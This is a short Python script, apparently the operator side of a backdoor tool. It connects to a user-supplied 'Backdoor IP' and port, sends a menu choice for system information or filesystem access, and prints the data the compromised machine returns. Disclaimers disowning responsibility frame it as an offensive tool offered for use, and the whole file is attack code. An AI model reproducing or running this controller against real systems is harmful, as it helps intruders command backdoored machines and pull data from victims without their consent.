#!/bin/python3

import socket
import sys
print("\n")
print("NOT FOR ILLEGAL OR GOVERNMENT USE")
print("I AM NOT RESPONSIBLE FOR WHAT YOU DO WITH THIS TOOL")
print("="*70)
address = input("Backdoor IP: ")
port = int(input("Backdoor Port: "))

mySock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mySock.connect((address, port))
print("Connection made \n")
print("==Options==\n")
print("[1] System Information")
print("[2] Filesystem")
message = input("Send option: ")
mySock.sendall(message.encode())

while 1:	
	data = mySock.recv(1024)
	print("======REQUESTED INFO======")
	print(data.decode('utf-8'))
	print("======RECIEVED======")
	print("\n")
	
mySock.close()


